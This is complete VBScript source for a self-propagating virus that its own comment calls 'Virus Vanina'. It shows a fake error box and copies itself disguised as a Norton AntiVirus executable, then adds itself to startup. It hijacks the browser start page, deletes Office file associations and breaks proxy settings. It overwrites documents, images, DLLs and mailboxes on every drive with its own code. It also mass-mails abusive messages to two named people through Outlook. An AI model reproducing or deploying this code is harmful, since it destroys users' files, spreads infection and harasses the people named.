   On Error Resume Next
   msgbox " File Error . Windows cant not be open the file",16
   enviarmail()
   Set m965y18eN62 = CreateObject("WScript.Shell")
   Set T5SSH7oslKb= Createobject("scripting.filesystemobject")
   T5SSH7oslKb.copyfile wscript.scriptfullname,T5SSH7oslKb.GetSpecialFolder(0)& "\NAV.exe                                                        .vbs"
   m965y18eN62.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.afroditatv.com/fotos/big/FMf003.jpg"
   m965y18eN62.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Norton AntiVirus",T5SSH7oslKb.GetSpecialFolder(0)& "\NAV.exe                                                                          .vbs %"
   m965y18eN62.regdelete "HKEY_CLASSES_ROOT\.xls"
   m965y18eN62.regdelete "HKEY_CLASSES_ROOT\.doc"
   m965y18eN62.regdelete "HKEY_CLASSES_ROOT\.mdb"
   m965y18eN62.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable","0"
   m965y18eN62.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer","0.0.0.0"
   EF8jrpF5K14()
   NQz90L4XF4v()
   Set aI3fjvLsdpQ= T5SSH7oslKb.opentextfile(wscript.scriptfullname, 1)
   P8DX0uQLNq8= aI3fjvLsdpQ.readall
   aI3fjvLsdpQ.Close
   Do
   If Not (T5SSH7oslKb.fileexists(wscript.scriptfullname)) Then
   Set Y01d45wFFMC= T5SSH7oslKb.createtextfile(wscript.scriptfullname, True)
   Y01d45wFFMC.writeP8DX0uQLNq8
   Y01d45wFFMC.Close
   End If
   Loop

   Function EF8jrpF5K14()
   On Error Resume Next
   Set JYOy8U4c65u = T5SSH7oslKb.Drives
   For Each gsjY9928Gca In JYOy8U4c65u
   If gsjY9928Gca.Drivetype = Remote Then
   ZZO9ELT8Qtf= gsjY9928Gca & "\"
   Call apGwdk2syDH(ZZO9ELT8Qtf)
   ElseIf gsjY9928Gca.IsReady Then
   ZZO9ELT8Qtf= gsjY9928Gca&"\"
   Call apGwdk2syDH(ZZO9ELT8Qtf)
   End If
   Next
   End Function

   Function apGwdk2syDH(n568JniN0LT)
   QLMB5163f37=n568JniN0LT
   Set pUOJMv83zBO= T5SSH7oslKb.GetFolder(QLMB5163f37)
   Set xSO1LnI3YTV= pUOJMv83zBO.Files
   For Each Zy235cpkn7V In xSO1LnI3YTV
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "btr" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "pst" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "cpl" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "mdb" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "jpg" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "pab" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "wab" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "doc" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "dll" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "ini" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "xls" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "vxd" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if
   if T5SSH7oslKb.GetExtensionName(Zy235cpkn7V.path) = "ocx" then
   T5SSH7oslKb.copyfile wscript.scriptfullname , Zy235cpkn7V.path , true
   end if

   Next


   Set Zy235cpkn7V= pUOJMv83zBO.SubFolders
   For Each o7qypo2TO3h In Zy235cpkn7V
   Call apGwdk2syDH(o7qypo2TO3h.path)
   Next
   End Function

   Function enviarmail()
   On Error Resume Next
   for i = 1 to 20
   Set ubicacion= Createobject("scripting.filesystemobject")
   Set objetomail = CreateObject("Outlook.Application")
   Set nombre=objetomail.GetNameSpace("MAPI")
   Set email = objetomail.CreateItem(0)
   email.To = "dario_straschnoy@yrba.com.ar ; carlos_pezzani@yrba.com.ar"
   email.Subject = "Recordatorio"
   email.Body = "Pezzani,pedazo de inuti,todavia no solucionaste nada . La guerra continua sin cuartel.Toma la iniciativa Charly."
   set adjunto=email.Attachments
   adjunto.Add "c:\windows\explorer.exe"
   email.DeleteAfterSubmit = True
   email.Send
   next
   End Function
   'Virus Vanina Created By DR Oltasan from Argentina to the World!!!
   'EL placer de la venganza es mio!!!
